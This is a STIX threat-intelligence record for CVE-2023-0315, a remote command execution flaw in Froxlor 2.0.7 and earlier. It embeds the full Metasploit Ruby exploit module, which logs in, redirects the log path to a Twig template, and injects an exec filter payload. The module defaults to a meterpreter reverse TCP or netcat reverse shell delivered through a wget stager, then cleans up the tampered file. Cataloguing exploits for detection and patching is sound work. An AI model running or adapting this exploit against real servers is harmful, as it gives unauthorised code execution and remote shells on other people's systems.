{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b6b47d87-0cec-4b2c-b51e-5de52642253e",
    "created": "2024-08-14T17:03:40.36839Z",
    "modified": "2024-08-14T17:03:40.368394Z",
    "name": "Froxlor Log Path RCE",
    "description": " Froxlor v2.0.7 and below suffer from a bug that allows authenticated users to change the application logs path to any directory on the OS level which the user www-data can write without restrictions from the backend which leads to writing a malicious Twig template that the application will render. That will lead to achieving a remote command execution under the user www-data. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/froxlor_log_path_rce.rb",
            "external_id": "froxlor_log_path_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://shells.systems/author/askar/"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-0315"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Froxlor Log Path RCE',\n        'Description' => %q{\n          Froxlor v2.0.7 and below suffer from a bug that allows authenticated users to change the application logs path\n          to any directory on the OS level which the user www-data can write without restrictions from the backend which\n          leads to writing a malicious Twig template that the application will render. That will lead to achieving a\n          remote command execution under the user www-data.\n        },\n        'Author' => [\n          'Askar', # discovery\n          'jheysel-r7' # module\n        ],\n        'References' => [\n          [ 'URL', 'https://shells.systems/author/askar/'],\n          [ 'CVE', '2023-0315']\n        ],\n        'License' => MSF_LICENSE,\n        'Platform' => 'linux',\n        'Privileged' => false,\n        'Arch' => [ ARCH_CMD ],\n        'Targets' => [\n          [\n            'Linux ',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'CmdStagerFlavor' => ['wget'],\n              'Type' => :linux_dropper,\n              'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp' }\n            }\n          ],\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_memory,\n              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_netcat' }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        },\n        'DisclosureDate' => '2023-01-29'\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('USERNAME', [true, 'A specific username to authenticate as', 'admin']),\n        OptString.new('PASSWORD', [true, 'A specific password to authenticate with', '']),\n        OptString.new('TARGETURI', [true, 'The base path to the vulnerable Froxlor instance', '/froxlor']),\n        OptString.new('WEB_ROOT', [true, 'The webroot ', '/var/www/html'])\n      ]\n    )\n  end\n\n  def login\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/index.php'),\n      'keep_cookies' => true,\n      'vars_post' => {\n        'loginname' => datastore['USERNAME'],\n        'password' => datastore['PASSWORD'],\n        'send' => 'send',\n        'dologin' => ''\n      }\n    )\n\n    if res && (res.code == 302 && res.headers.include?('Location') && res.headers['Location'] == 'admin_index.php')\n      send_request_cgi(\n        'method' => 'GET',\n        'uri' => normalize_uri(target_uri.path, '/admin_index.php'),\n        'keep_cookies' => true\n      )\n      print_good('Successful login')\n      true\n    else\n      false\n    end\n  end\n\n  def check\n    begin\n      @authenticated = login\n    rescue InvalidRequest, InvalidResponse => e\n      return Exploit::CheckCode::Unknown(\"Failed to authenticate to Froxlor: #{e.class}, #{e}\")\n    end\n\n    version_url = '/lib/ajax.php?action=updatecheck&theme=Froxlor'\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, version_url),\n      'keep_cookies' => true\n    )\n\n    if res.nil? || res.code != 200\n      Exploit::CheckCode::Unknown(\"Failed to retrieve version info from #{normalize_uri(target_uri.path, version_url)}\")\n    else\n      version = res.get_html_document.at('body/span/text()')\n      if version\n        if Rex::Version.new('2.0.7') >= Rex::Version.new(version)\n          Exploit::CheckCode::Appears(\"Vulnerable version found: #{version}\")\n        else\n          Exploit::CheckCode::Safe(\"Non-vulnerable version found: #{version}\")\n        end\n      else\n        Exploit::CheckCode::Unknown(\"Failed to obtain Froxlor version info from #{normalize_uri(target_uri.path, version_url)}\")\n      end\n    end\n  end\n\n  def get_csrf_token(url)\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, url),\n      'keep_cookies' => true\n    )\n\n    fail_with(Failure::UnexpectedReply, \"Failed to get csrf token from #{normalize_uri(target_uri.path, url)}\") unless (!res.nil? || res.code == 200)\n    csrf_token = res.get_html_document.at('//input[@name=\"csrf_token\"]/@value')&.text\n    fail_with(Failure::UnexpectedReply, \"No CSRF token found when querying #{normalize_uri(target_uri.path, url)}.\") unless csrf_token\n    print_good(\"CSRF token is : #{csrf_token}\")\n    csrf_token\n  end\n\n  def change_log_path(new_logfile)\n    mime = Rex::MIME::Message.new\n    mime.add_part('0', nil, nil, 'form-data; name=\"logger_enabled\"')\n    mime.add_part('1', nil, nil, 'form-data; name=\"logger_enabled\"')\n    mime.add_part('2', nil, nil, 'form-data; name=\"logger_severity\"')\n    mime.add_part('file', nil, nil, 'form-data; name=\"logger_logtypes[]\"')\n    mime.add_part(new_logfile, nil, nil, 'form-data; name=\"logger_logfile\"')\n    mime.add_part('0', nil, nil, 'form-data; name=\"logger_log_cron\"')\n    mime.add_part(@csrf_token, nil, nil, 'form-data; name=\"csrf_token\"')\n    mime.add_part('overview', nil, nil, 'form-data; name=\"page\"')\n    mime.add_part('', nil, nil, 'form-data; name=\"action\"')\n    mime.add_part('send', nil, nil, 'form-data; name=\"send\"')\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/admin_settings.php?'),\n      'vars_get' => { 'page' => 'overview', 'part' => 'logging' },\n      'keep_cookies' => true,\n      'ctype' => \"multipart/form-data; boundary=#{mime.bound}\",\n      'data' => mime.to_s\n    )\n\n    if res && res.code == 200 && res.body.include?('The settings have been successfully saved')\n      return true\n    end\n\n    false\n  end\n\n  def execute_command(cmd, _opts = {})\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/admin_index.php'),\n      'keep_cookies' => true,\n      'vars_post' => {\n        'theme' => \"{{['#{cmd}']|filter('exec')}}\",\n        'csrf_token' => @csrf_token,\n        'page' => 'change_theme',\n        'send' => 'send',\n        'dosave' => ''\n      }\n    )\n\n    if res && res.code == 302 && res.headers['Location']\n      if res.headers['Location'] == 'admin_index.php'\n        print_good('Injected payload successfully')\n        print_status(\"Changing log path back to default value while triggering payload: #{datastore['WEB_ROOT']}#{datastore['TARGETURI']}/logs/froxlor.log\")\n        change_log_path(\"#{datastore['WEB_ROOT']}#{datastore['TARGETURI']}/logs/froxlor.log\")\n      end\n    else\n      print_error('did not inject payload successfully')\n    end\n  end\n\n  def exploit\n    fail_with(Failure::NoAccess, 'Failed to login') unless @authenticated || login\n    @csrf_token = get_csrf_token('/admin_settings.php?page=overview&part=logging')\n\n    if change_log_path(\"#{datastore['WEB_ROOT']}#{datastore['TARGETURI']}/templates/Froxlor/footer.html.twig\")\n      print_good(\"Changed logfile path to: #{datastore['WEB_ROOT']}#{datastore['TARGETURI']}/templates/Froxlor/footer.html.twig\")\n      case target['Type']\n      when :unix_memory\n        execute_command(payload.encoded)\n      when :linux_dropper\n        execute_cmdstager\n      else\n        print_error('Please enter valid target')\n      end\n    else\n      fail_with(Failure::UnexpectedReply, 'Failed to change the log path. The target might not be exploitable')\n    end\n  end\n\n  def on_new_session(session)\n    super\n    # Original footer.html.twig file\n    footer_html_twig = <<~EOF\n      <footer class=\"text-center mb-3\">\n              <span>\n                      <img src=\"{{ basehref|default(\"\") }}templates/Froxlor/assets/img/logo_grey.png\" alt=\"Froxlor\"/>\n                      {% if install_mode is not defined  %}\n                              {% if (get_setting('admin.show_version_login') == '1'\n                                      and area == 'login') or (area != 'login'\n                                      and get_setting('admin.show_version_footer') == '1') %}\n                                      {{ call_static('\\\\Froxlor\\\\Froxlor', 'getFullVersion') }}\n                              {% endif %}\n                      {% endif %}\n                      &copy; 2009-{{ \"now\"|date(\"Y\") }} by <a href=\"https://www.froxlor.org/\" rel=\"external\" target=\"_blank\">the Froxlor Team</a><br>\n                      {% if install_mode is not defined %}\n                              {% if (get_setting('panel.imprint_url') != '') %}<a href=\"{{ get_setting('panel.imprint_url') }}\" target=\"_blank\" class=\"footer-link\">{{ lng('imprint') }}</a>{% endif %}\n                              {% if (get_setting('panel.terms_url') != '') %}<a href=\"{{ get_setting('panel.terms_url') }}\" target=\"_blank\" class=\"footer-link\">{{ lng('terms') }}</a>{% endif %}\n                              {% if (get_setting('panel.privacy_url') != '') %}<a href=\"{{ get_setting('panel.privacy_url') }}\" target=\"_blank\" class=\"footer-link\">{{ lng('privacy') }}</a>{% endif %}\n                      {% endif %}\n              </span>\n\n          {% if lng('translator') %}\n                      <br/>\n              <small class=\"mt-3\">{{ lng('panel.translator') }}: {{ lng('translator') }}</small>\n          {% endif %}\n      </footer>\n    EOF\n    if session.type == 'meterpreter'\n      print_status('Deleting tampered footer.html.twig file')\n      filename = \"#{datastore['WEB_ROOT']}#{datastore['TARGETURI']}/templates/Froxlor/footer.html.twig\"\n      session.fs.file.rm(filename)\n      fd = session.fs.file.new(filename, 'wb')\n      print_status('Rewriting clean footer.html.twig file')\n      fd.write(footer_html_twig)\n      fd.close\n    else\n      print_status('Cleaning tampered footer.html.twig file')\n      # Remove all log lines added to footer.html.twig by the exploit\n      # (all log lines start with an opening square bracket ex: [2023-02-16 09:08:28] froxlor.INFO: [API] ...)\n      session.shell_command_token(\"sed '/^\\\\[/d' #{datastore['WEB_ROOT']}#{datastore['TARGETURI']}/templates/Froxlor/footer.html.twig > #{datastore['WEB_ROOT']}#{datastore['TARGETURI']}/templates/Froxlor/tmp\")\n      session.shell_command_token(\"mv -f #{datastore['WEB_ROOT']}#{datastore['TARGETURI']}/templates/Froxlor/tmp #{datastore['WEB_ROOT']}#{datastore['TARGETURI']}/templates/Froxlor/footer.html.twig\")\n      session.shell_command_token(\"rm #{datastore['WEB_ROOT']}#{datastore['TARGETURI']}/templates/Froxlor/tmp\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-01-29",
    "x_mitre_platforms": [
        "unix'"
    ]
}